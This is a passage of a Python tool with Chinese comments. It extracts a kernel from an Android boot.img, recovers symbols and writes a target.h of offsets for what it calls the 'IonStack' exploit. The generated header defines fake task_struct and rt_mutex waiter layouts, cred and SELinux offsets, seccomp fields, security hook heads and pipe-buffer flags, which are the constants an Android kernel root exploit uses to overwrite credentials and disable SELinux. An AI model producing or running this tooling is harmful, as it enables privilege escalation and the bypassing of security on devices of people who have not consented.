    fp = build_info.get('build_fingerprint', '').lower()
    device = build_info.get('device', '').lower()

    # MediaTek 平台：物理内存从 0x40000000 开始
    if 'alps' in fp or 'mt' in device or 'mgvi' in fp:
        return 0x40000000

    # Qualcomm / Google Pixel 平台：物理内存在 0x80000000
    return 0x80000000


def get_text_offset(kernel_img):
    """从 arm64 Image 头部提取 text_offset。"""
    if len(kernel_img) < 0x28:
        return 0
    # arm64 Image 头部：text_offset 在 0x08（8 字节 LE）
    text_offset = struct.unpack_from('<Q', kernel_img, 0x08)[0]
    # 合理性检查
    if text_offset > 0x200000:
        return 0
    return text_offset


# ============================================================================
# target.h 生成
# ============================================================================

def generate_targeth(target_name, build_info, kimage_base, phys_offset,
                     text_offset, offsets, verified, device_override=None,
                     fops_layout='6.6', ashmem_impl='c'):
    """生成 target.h 文件内容字符串。"""

    kernel_phys_load = phys_offset + text_offset

    # 构建变体标签："<device>_<buildid>_<kernel_variant>"
    # 例如 "ace5s_ap3a_240617_008_abogki"
    build_id = build_info.get('build_id', 'unknown')
    if device_override:
        device = device_override
    else:
        device = build_info.get('device', 'unknown')
        # 从设备名称中去除 ":<androidversion>" 后缀（例如
        # "mgvi_64_64only_armv82:15" -> "mgvi_64_64only_armv82"）
        device = device.split(':')[0]
    bid_norm = build_id.lower().replace('.', '_')
    kernel_variant = build_info.get('kernel_variant', '')
    if kernel_variant:
        variant_label = f"{device}_{bid_norm}_{kernel_variant}"
    else:
        variant_label = f"{device}_{bid_norm}"
    fingerprint = build_info.get('build_fingerprint', 'unknown')

    # 收集所有符号偏移量
    def off(name):
        return offsets.get(name)

    lines = []
    lines.append("#ifndef OFFSET_H")
    lines.append("#define OFFSET_H")
    lines.append("")
    lines.append(f'#define BUILD_VARIANT_LABEL "{variant_label}"')
    lines.append("#ifndef BUILD_FINGERPRINT")
    lines.append(f'#define BUILD_FINGERPRINT "{fingerprint}"')
    lines.append("#endif")
    lines.append("")
    lines.append(f"#define KIMAGE_TEXT_BASE {kimage_base:#018x}ULL")
    lines.append("#define P0_PAGE_OFFSET 0xffffff8000000000ULL")
    lines.append(f"#define P0_PHYS_OFFSET {phys_offset:#010x}ULL")
    lines.append(f"#define P0_KERNEL_PHYS_LOAD {kernel_phys_load:#010x}ULL")
    lines.append("#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL")
    lines.append("#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL")
    lines.append("#define DIRECT_MAP_BASE 0xffffff8000000000ULL")
    lines.append("#define DIRECT_MAP_END 0xffffff9000000000ULL")
    lines.append("#define VMEMMAP_START 0xfffffffe00000000ULL")
    lines.append("")

    # 符号偏移量
    # 为 Rust ashmem / static-call 安全钩子添加注释
    if ashmem_impl == 'rust':
        lines.append("/* ashmem 在此内核上以 Rust 实现（ashmem_rust 模块），")
        lines.append(" * 因此传统的 C 符号（ashmem_fops, ashmem_misc）")
        lines.append(" * 不存在。ASHMEM_FOPS_OFF 指向 Rust MiscDevice 框架")
        lines.append(" * 生成的 const file_operations 表（在 .rodata 中）。")
        lines.append(" * ASHMEM_MISC_FOPS_OFF 指向 ASHMEM_FOPS_PTR BSS 变量，")
        lines.append(" * 该变量在运行时保存 fops 指针（由 __ashmem_rust_init 填充）。")
        lines.append(" * 其余 ASHMEM_*_OFF 值是 Rust MiscDevice vtable 跳板函数。 */")

    if off('security_hook_heads_src') == 'static_call':
        lines.append("/* 此内核将 security_hook_heads list_head 数组")
        lines.append(" * 替换为基于 static-call 的 security_hook_active_* 槽位。")
        lines.append(" * SECURITY_HOOK_HEADS_OFF 计算为")
        lines.append(" * security_hook_active_capable_0 - 0x40，使得")
        lines.append(" * SECURITY_CAPABLE_HEAD（= SECURITY_HOOK_HEADS + 0x40）落在")
        lines.append(" * security_hook_active_capable_0 上。root.c 仅使用")
        lines.append(" * 之前/之后的比较进行诊断，因此读取此")
        lines.append(" * 地址是安全的。 */")

    sym_defines = [
        ('ASHMEM_MISC_FOPS_OFF', off('ashmem_misc_fops')),
        ('ASHMEM_FOPS_OFF', off('ashmem_fops')),
        ('ASHMEM_IOCTL_OFF', off('ashmem_ioctl')),
        ('ASHMEM_COMPAT_IOCTL_OFF', off('compat_ashmem_ioctl')),
        ('ASHMEM_MMAP_OFF', off('ashmem_mmap')),
        ('ASHMEM_OPEN_OFF', off('ashmem_open')),
        ('ASHMEM_RELEASE_OFF', off('ashmem_release')),
        ('ASHMEM_SHOW_FDINFO_OFF', off('ashmem_show_fdinfo')),
        ('CONFIGFS_READ_ITER_OFF', off('configfs_read_iter')),
        ('CONFIGFS_BIN_WRITE_ITER_OFF', off('configfs_bin_write_iter')),
        ('COPY_SPLICE_READ_OFF', off('copy_splice_read')),
        ('NOOP_LLSEEK_OFF', off('noop_llseek')),
        ('INIT_TASK_OFF', off('init_task')),
        ('ROOT_TASK_GROUP_OFF', off('root_task_group')),
        ('SELINUX_BLOB_SIZES_OFF', off('selinux_blob_sizes')),
        ('SELINUX_ENFORCING_OFF', off('selinux_state')),
        ('SECURITY_HOOK_HEADS_OFF', off('security_hook_heads')),
        ('KMALLOC_CACHES_OFF', off('kmalloc_caches')),
        ('ANON_PIPE_BUF_OPS_OFF', off('anon_pipe_buf_ops')),
    ]
    for name, val in sym_defines:
        if val is not None:
            lines.append(f"#define {name} {val:#010x}ULL")
    lines.append("")

    # 符号地址宏（仅对已定义的偏移量生成）
    for name, val in sym_defines:
        if val is not None:
            base = name.replace('_OFF', '')
            lines.append(f"#define {base} (KIMAGE_TEXT_BASE + {name})")
    lines.append("")

    # SLIDE 偏移量（缺失时跳过，仅输出有效值）
    slide_defines = [
        ('SLIDE_NFULNL_LOGGER_OFF', off('SLIDE_NFULNL_LOGGER_OFF')),
        ('SLIDE_LOGGERS_0_1_OFF', off('SLIDE_LOGGERS_0_1_OFF')),
        ('SLIDE_RANDOM_BOOT_ID_DATA_OFF', off('SLIDE_RANDOM_BOOT_ID_DATA_OFF')),
        ('SLIDE_SYSCTL_BOOTID_OFF', off('SLIDE_SYSCTL_BOOTID_OFF')),
    ]
    has_slide = all(v is not None for _, v in slide_defines)
    if has_slide:
        for name, val in slide_defines:
            lines.append(f"#define {name} {val:#010x}ULL")
        lines.append("#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF")
        lines.append("#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF")
        lines.append("#define SLIDE_WONLY_BOOTID 1")
        lines.append("")
        lines.append("#define SLIDE_NFULNL_LOGGER_IMAGE \\")
        lines.append("  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)")
        lines.append("#define SLIDE_LOGGERS_0_1_IMAGE \\")
        lines.append("  (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)")
        lines.append("#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE \\")
        lines.append("  (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)")
        lines.append("#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)")
        lines.append("#define SLIDE_ROOT_TASK_GROUP_IMAGE \\")
        lines.append("  (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)")
        lines.append("#define SLIDE_SYSCTL_BOOTID_IMAGE \\")
        lines.append("  (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)")
    else:
        missing = [name for name, val in slide_defines if val is None]
        lines.append(f"/* SLIDE 偏移量不完整，已跳过：{', '.join(missing)} */")
    lines.append("")

    # 漏洞利用页面布局（IonStack 漏洞利用常量）
    lines.append("#define LOCK_OFF 0x1350")
    lines.append("#define W0_OFF 0x2220")
    lines.append("#define FOPS_OFF 0x1000")
    lines.append("#define SCRATCH_OFF 0x3000")
    lines.append("#define RIGHT_OFF 0x4440")
    lines.append("#define LEFT_OFF 0x5550")
    lines.append("#define FAKE_TASK_OFF 0x3200")
    lines.append("")

    # Waiter 结构体偏移量（GKI 6.6 常量）
    waiter_defs = [
        ("WAITER_LOCAL_OFF", "0x80"),
        ("WAITER_TREE_ENTRY_OFF", "0x00"),
        ("WAITER_PI_TREE_ENTRY_OFF", "0x18"),
        ("WAITER_TASK_OFF", "0x30"),
        ("WAITER_LOCK_OFF", "0x38"),
        ("WAITER_WAKE_STATE_OFF", "0x40"),
        ("WAITER_PRIO_OFF", "0x44"),
        ("WAITER_DEADLINE_OFF", "0x48"),
        ("WAITER_WW_CTX_OFF", "0x50"),
    ]
    for name, val in waiter_defs:
        lines.append(f"#define {name} {val}")
    lines.append("")

    # 假 waiter 结构体偏移量（GKI 6.6 常量）
    fake_waiter_defs = [
        ("FAKE_WAITER_TREE_PRIO_OFF", "0x18"),
        ("FAKE_WAITER_TREE_DEADLINE_OFF", "0x20"),
        ("FAKE_WAITER_PI_TREE_ENTRY_OFF", "0x28"),
        ("FAKE_WAITER_PI_TREE_PRIO_OFF", "0x40"),
        ("FAKE_WAITER_PI_TREE_DEADLINE_OFF", "0x48"),
        ("FAKE_WAITER_TASK_OFF", "0x50"),
        ("FAKE_WAITER_LOCK_OFF", "0x58"),
        ("FAKE_WAITER_WAKE_STATE_OFF", "0x60"),
        ("FAKE_WAITER_WW_CTX_OFF", "0x68"),
    ]
    for name, val in fake_waiter_defs:
        lines.append(f"#define {name} {val}")
    lines.append("")

    # 假 task 结构体偏移量（GKI 6.6 常量）
    fake_task_defs = [
        ("FAKE_TASK_USAGE_OFF", "0x40"),
        ("FAKE_TASK_PRIO_OFF", "0x84"),
        ("FAKE_TASK_NORMAL_PRIO_OFF", "0x8c"),
        ("FAKE_TASK_TASK_GROUP_OFF", "0x348"),
        ("FAKE_TASK_PI_LOCK_OFF", "0x90c"),
        ("FAKE_TASK_PI_WAITERS_OFF", "0x920"),
        ("FAKE_TASK_PI_TOP_TASK_OFF", "0x930"),
        ("FAKE_TASK_PI_BLOCKED_ON_OFF", "0x938"),
    ]
    for name, val in fake_task_defs:
        lines.append(f"#define {name} {val}")
    lines.append("")

    # ConfigFS 偏移量（GKI 6.6 常量）
    cfg_defs = [
        ("CFG_PAGE_OFF", "16"),
        ("CFG_NEEDS_READ_FILL_OFF", "80"),
        ("CFG_BIN_BUFFER_OFF", "88"),
        ("CFG_BIN_BUFFER_SIZE_OFF", "96"),
        ("CFG_CB_MAX_SIZE_OFF", "100"),
    ]
    for name, val in cfg_defs:
        lines.append(f"#define {name} {val}")
    lines.append("")

    # Task 结构体偏移量（已验证）
    task = verified.get('task', {})
    task_defs = [
        ("MM_OWNER_OFF", "1032"),
        ("TASK_PID_OFF", hex(task.get('TASK_PID_OFF', 0x618))),
        ("TASK_TGID_OFF", hex(task.get('TASK_TGID_OFF', 0x61c))),
        ("TASK_REAL_PARENT_OFF", hex(task.get('TASK_REAL_PARENT_OFF', 0x628))),
        ("TASK_ATOMIC_FLAGS_OFF", hex(task.get('TASK_ATOMIC_FLAGS_OFF', 0x5d8))),
        ("TASK_REAL_CRED_OFF", hex(task.get('TASK_REAL_CRED_OFF', 0x818))),
        ("TASK_CRED_OFF", hex(task.get('TASK_CRED_OFF', 0x820))),
        ("TASK_COMM_OFF", hex(task.get('TASK_COMM_OFF', 0x830))),
        ("TASK_TASKS_OFF", hex(task.get('TASK_TASKS_OFF', 0x550))),
        ("TASK_THREAD_INFO_FLAGS_OFF", "0x00"),
        ("TASK_SECCOMP_OFF", hex(task.get('TASK_SECCOMP_OFF', 0x8e8))),
    ]
    for name, val in task_defs:
        lines.append(f"#define {name} {val}")
    lines.append("")

    # Cred 结构体偏移量（已验证）
    cred = verified.get('cred', {})
    cred_defs = [
        ("CRED_UID_OFF", str(cred.get('CRED_UID_OFF', 8))),
        ("CRED_SECUREBITS_OFF", str(cred.get('CRED_SECUREBITS_OFF', 40))),
        ("CRED_CAPS_OFF", str(cred.get('CRED_CAPS_OFF', 48))),
        ("CRED_SECURITY_OFF", str(cred.get('CRED_SECURITY_OFF', 128))),
        ("SELINUX_CRED_BLOB_OFF", "0"),
        ("SELINUX_CRED_OSID_OFF", "0"),
        ("SELINUX_CRED_SID_OFF", "4"),
    ]
    for name, val in cred_defs:
        lines.append(f"#define {name} {val}")
    lines.append("")

    # Seccomp / 页面 / pipe / FOPS 偏移量（GKI 6.6 常量）
    const_defs = [
        ("SECCOMP_MODE_OFF", "0x00"),
        ("SECCOMP_FILTER_COUNT_OFF", "0x04"),
        ("SECCOMP_FILTER_OFF", "0x08"),
        ("TIF_SECCOMP_BIT", "11"),
        ("PFA_NO_NEW_PRIVS_BIT", "0"),
    ]
    for name, val in const_defs:
        lines.append(f"#define {name} {val}")
    lines.append("")

    # 页面 / pipe 常量
    page_defs = [
        ("STRUCT_PAGE_SIZE", "0x40"),
        ("STRUCT_PAGE_COMPOUND_HEAD_OFF", "0x08"),
        ("STRUCT_SLAB_CACHE_OFF", "0x08"),
        ("STRUCT_PAGE_TYPE_OFF", "0x30"),
    ]
    for name, val in page_defs:
        lines.append(f"#define {name} {val}")
    lines.append("")

    pipe_defs = [
        ("PIPE_BUFFER_SIZE", "0x28"),
        ("PIPE_BUFFER_SLOTS", "32"),
        ("PIPE_BUF_FLAG_CAN_MERGE", "0x10"),
    ]
    for name, val in pipe_defs:
        lines.append(f"#define {name} {val}")
    lines.append("")

    # FOPS 偏移量（布局依赖：6.6 vs 6.12）
    fops_defs = FOPS_FIELD_DEFINES.get(fops_layout, FOPS_FIELD_DEFINES['6.6'])
    for name, val in fops_defs:
        lines.append(f"#define {name} {val}")
    lines.append("")
    lines.append("#endif")

    return '\n'.join(lines) + '\n'


# ============================================================================
# 主函数
# ============================================================================

def main():
    parser = argparse.ArgumentParser(
        description='从 Android boot.img 自动提取内核偏移量'
    )
    parser.add_argument('boot_img', help='boot.img 文件路径')
    parser.add_argument('-o', '--output', default='./extracted_target',
                        help='输出目录（默认：./extracted_target）')
    parser.add_argument('-k', '--kallsyms', default=None,
                        help='预恢复的 kallsyms 文件')
    parser.add_argument('--keep-intermediate', action='store_true',
                        help='保留中间文件')
    parser.add_argument('--target-name', default=None,
                        help='目标目录名称（默认：自动检测）')
    parser.add_argument('--device', default=None,
                        help='覆盖 BUILD_VARIANT_LABEL 中的设备名称'
                             '（例如 "ace5s"）。默认：从指纹中获取。')
    args = parser.parse_args()

    boot_path = args.boot_img
    if not os.path.exists(boot_path):
        print(f"错误：{boot_path} 不存在", file=sys.stderr)
        sys.exit(1)

    # 步骤 1：读取 boot.img
    print(f"[1/7] 读取 boot.img：{boot_path}")
    with open(boot_path, 'rb') as f:
        boot_data = f.read()
    print(f"  大小：{len(boot_data)} 字节 ({len(boot_data) / 1024 / 1024:.1f} MB)")

    # 步骤 2：解析 boot.img 头部
    print("[2/7] 解析 boot.img 头部")
    boot_info = parse_boot_img(boot_data)
    print(f"  头部版本：v{boot_info['header_version']}")
    print(f"  页大小：{boot_info['page_size']}")
    print(f"  头部大小：{boot_info['header_size']} 字节")
    print(f"  内核大小：{boot_info['kernel_size']} 字节 ({boot_info['kernel_size'] / 1024 / 1024:.1f} MB)")
    print(f"  内核偏移量：{boot_info['kernel_offset']:#x}")
    if 'dtb_size' in boot_info and boot_info['dtb_size'] > 0:
        print(f"  DTB 大小：{boot_info['dtb_size']} 字节")
        print(f"  DTB 地址：{boot_info['dtb_addr']:#018x}")

    # 步骤 3：提取并解压缩内核
    print("[3/7] 提取内核 Image")
    kernel_img = extract_kernel(boot_info)
    print(f"  解压缩后大小：{len(kernel_img)} 字节 ({len(kernel_img) / 1024 / 1024:.1f} MB)")

    # 保存内核 Image
    os.makedirs(args.output, exist_ok=True)
    kernel_path = os.path.join(args.output, 'kernel.Image')
    with open(kernel_path, 'wb') as f:
        f.write(kernel_img)
    print(f"  已保存到：{kernel_path}")

    # 步骤 4：恢复 kallsyms
    print("[4/7] 恢复 kallsyms")
    if args.kallsyms:
        print(f"  使用预恢复的 kallsyms：{args.kallsyms}")
        syms = parse_kallsyms_file(args.kallsyms)
    else:
        syms = recover_kallsyms(kernel_path)
    print(f"  恢复了 {len(syms)} 个符号")

    # 检查必需的符号
    missing = []
    for name in REQUIRED_SYMBOLS:
        aliases = SYMBOL_ALIASES.get(name, [name])
        found = any(a in syms for a in aliases)
        if not found:
            missing.append(name)
    if missing:
        print(f"  警告：缺少符号：{', '.join(missing)}", file=sys.stderr)

    # 步骤 5：二进制分析和验证
    print("[5/7] 通过二进制分析验证偏移量")
    ki = KernelImage(kernel_img, syms)

    # 收集所有符号偏移量
    offsets = {}
    fops_layout = '6.6'  # 默认值，将由验证更新
    ashmem_impl = 'c'    # 默认值，如果检测到 Rust ashmem 则更新

    # 检测 ashmem 实现：C（传统）vs Rust（Qualcomm 6.12）
    has_c_ashmem = ki.sym_addr('ashmem_fops') is not None
    rust_methods = ki.find_rust_ashmem_methods() if not has_c_ashmem else {}

    if has_c_ashmem:
        print("  ashmem 实现：C（传统符号）")
        ashmem_impl = 'c'

        # ASHMEM_MISC_FOPS（特殊：ashmem_misc + fops 字段偏移量）
        misc_fops_off, misc_msg = ki.find_ashmem_misc_fops()
        if misc_fops_off is not None:
            offsets['ashmem_misc_fops'] = misc_fops_off
            print(f"  ASHMEM_MISC_FOPS：{misc_fops_off:#010x}（{misc_msg}）")
        else:
            print(f"  警告：ASHMEM_MISC_FOPS：{misc_msg}", file=sys.stderr)

        # 其他 ashmem 符号偏移量（C 符号）
        ashmem_sym_map = [
            ('ashmem_fops', 'ashmem_fops'),
            ('ashmem_ioctl', 'ashmem_ioctl'),
            ('compat_ashmem_ioctl', 'compat_ashmem_ioctl'),
            ('ashmem_mmap', 'ashmem_mmap'),
            ('ashmem_open', 'ashmem_open'),
            ('ashmem_release', 'ashmem_release'),
            ('ashmem_show_fdinfo', 'ashmem_show_fdinfo'),
        ]
        for key, sym_name in ashmem_sym_map:
            sym_off = ki.sym_off(sym_name)
            if sym_off is not None:
                offsets[key] = sym_off
                print(f"  {key}：{sym_off:#010x}")
            else:
                print(f"  警告：{key}（符号 {sym_name}）：未找到",
                      file=sys.stderr)

    elif rust_methods:
        print(f"  ashmem 实现：Rust（ashmem_rust 模块）")
        print(f"  找到 {len(rust_methods)} 个 Rust ashmem vtable 方法：")
        ashmem_impl = 'rust'

        # 方法名 → 偏移量键映射
        rust_method_keys = {
            'ioctl': 'ashmem_ioctl',
            'compat_ioctl': 'compat_ashmem_ioctl',
            'mmap': 'ashmem_mmap',
            'open': 'ashmem_open',
            'release': 'ashmem_release',
            'show_fdinfo': 'ashmem_show_fdinfo',
        }
        for method, addr in sorted(rust_methods.items()):
            sym_off = ki.addr_to_off(addr)
            key = rust_method_keys.get(method)
            if key:
                offsets[key] = sym_off
            print(f"    {method}：{addr:#018x}（偏移量 {sym_off:#010x}）")

        # 通过扫描函数指针定位 file_operations 表
        print("  --- 定位 Rust ashmem fops 表 ---")
        layout_name, fops_off, fops_ok = ki.verify_fops_layout(
            methods=rust_methods)
        if fops_ok and fops_off is not None:
            offsets['ashmem_fops'] = fops_off
            fops_layout = layout_name
            print(f"  ASHMEM_FOPS：fops_off={fops_off:#010x} "
                  f"（布局={layout_name}）")
        else:
            print(f"  警告：无法定位 Rust ashmem fops 表："
                  f"{fops_ok}", file=sys.stderr)

        # 定位 ASHMEM_FOPS_PTR BSS 变量
        fops_ptr_off, fops_ptr_sym = ki.find_ashmem_fops_ptr()
        if fops_ptr_off is not None:
            offsets['ashmem_misc_fops'] = fops_ptr_off
            print(f"  ASHMEM_MISC_FOPS：{fops_ptr_off:#010x} "
                  f"（{fops_ptr_sym}）")
        else:
            print("  警告：在 kallsyms 中未找到 ASHMEM_FOPS_PTR",
                  file=sys.stderr)

    else:
        print("  警告：未找到 C 或 Rust ashmem 符号",
              file=sys.stderr)

    # 非 ashmem 符号偏移量（两种实现通用）
    sym_map = [
        ('configfs_read_iter', 'configfs_read_iter'),
        ('configfs_bin_write_iter', 'configfs_bin_write_iter'),
        ('copy_splice_read', 'copy_splice_read'),
        ('noop_llseek', 'noop_llseek'),
        ('init_task', 'init_task'),
        ('root_task_group', 'root_task_group'),
        ('selinux_blob_sizes', 'selinux_blob_sizes'),
        ('selinux_state', 'selinux_state'),
        ('kmalloc_caches', 'kmalloc_caches'),
        ('anon_pipe_buf_ops', 'anon_pipe_buf_ops'),
    ]
    for key, sym_name in sym_map:
        sym_off = ki.sym_off(sym_name)
        if sym_off is not None:
            offsets[key] = sym_off
            print(f"  {key}：{sym_off:#010x}")
        else:
            print(f"  警告：{key}（符号 {sym_name}）：未找到",
                  file=sys.stderr)

    # SECURITY_HOOK_HEADS（含 6.12 static-call 回退）
    print("  --- security_hook_heads ---")
    hook_off, hook_src = ki.find_security_hook_heads_off()
    if hook_off is not None:
        offsets['security_hook_heads'] = hook_off
        if 'static' in hook_src:
            offsets['security_hook_heads_src'] = 'static_call'
        print(f"  SECURITY_HOOK_HEADS：{hook_off:#010x}（{hook_src}）")
    else:
        print("  警告：SECURITY_HOOK_HEADS 未找到", file=sys.stderr)

    # SLIDE 偏移量
    print("  --- SLIDE 偏移量 ---")
    slide = ki.find_slide_offsets()
    for name, val in slide.items():
        if val is not None:
            offsets[name] = val  # 保留原始大写键名
            print(f"  {name}：{val:#010x}")

    # FOPS 布局验证（用于 C ashmem；Rust 已在上面的验证中完成）
    if ashmem_impl == 'c':
        print("  --- FOPS 布局验证 ---")
        layout_name, fops_off, fops_ok = ki.verify_fops_layout()
        if fops_ok:
            fops_layout = layout_name
            print(f"  FOPS 布局：已验证（布局={layout_name}）")
        else:
            print(f"  FOPS 布局：使用默认 {fops_layout} "
                  f"（验证结果：{fops_ok}）")

    # 验证 task_struct 偏移量
    print("  --- task_struct 偏移量验证 ---")
    task_results = ki.verify_task_offsets()
    if task_results:
        for name, val in task_results.items():
            print(f"  {name} = {val:#x}")
    else:
        print("  使用默认 task_struct 偏移量")

    # 验证 cred 结构体偏移量
    print("  --- cred 结构体偏移量验证 ---")
    cred_results = ki.verify_cred_offsets()
    if cred_results:
        for name, val in cred_results.items():
            print(f"  {name} = {val}")

    # 步骤 6：提取构建信息和内存布局
    print("[6/7] 提取构建信息")
    build_info = extract_build_info(boot_data, kernel_img)
    if 'linux_version' in build_info:
        print(f"  Linux 版本：{build_info['linux_version']}")
    if 'build_fingerprint' in build_info:
        print(f"  构建指纹：{build_info['build_fingerprint']}")
    if 'build_id' in build_info:
        print(f"  构建 ID：{build_info['build_id']}")

    # 确定内存布局（_text 或 _stext 均为有效的基础地址符号）
    kimage_base = syms.get('_text', syms.get('_stext', 0xffffffc080000000))
    text_offset = get_text_offset(kernel_img)
    phys_offset = detect_phys_offset(build_info)
    print(f"  KIMAGE_TEXT_BASE：{kimage_base:#018x}")
    print(f"  text_offset：{text_offset:#x}")
    print(f"  P0_PHYS_OFFSET：{phys_offset:#010x}（平台启发式规则）")
    print(f"  P0_KERNEL_PHYS_LOAD：{phys_offset + text_offset:#010x}")

    # 步骤 7：生成 target.h
    print("[7/7] 生成 target.h")

    # 确定目标名称
    if args.target_name:
        target_name = args.target_name
    else:
        build_id = build_info.get('build_id', 'unknown')
        device = build_info.get('device', 'unknown').split(':')[0]
        target_name = f"{device}-{build_id}"

    target_dir = os.path.join(args.output, target_name)
    os.makedirs(target_dir, exist_ok=True)
    target_path = os.path.join(target_dir, 'target.h')

    verified = {
        'task': task_results or {},
        'cred': cred_results or {},
    }

    content = generate_targeth(
        target_name, build_info, kimage_base, phys_offset,
        text_offset, offsets, verified, device_override=args.device,
        fops_layout=fops_layout, ashmem_impl=ashmem_impl
    )

    with open(target_path, 'w') as f:
        f.write(content)
    print(f"  已写入：{target_path}")

    # 清理
    if not args.keep_intermediate:
        try:
            os.remove(kernel_path)
            elf_path = kernel_path + '.elf'
            if os.path.exists(elf_path):
                os.remove(elf_path)
        except OSError:
            pass

    print("\n=== 完成 ===")
    print(f"target.h：{target_path}")
    return 0


if __name__ == '__main__':
    sys.exit(main())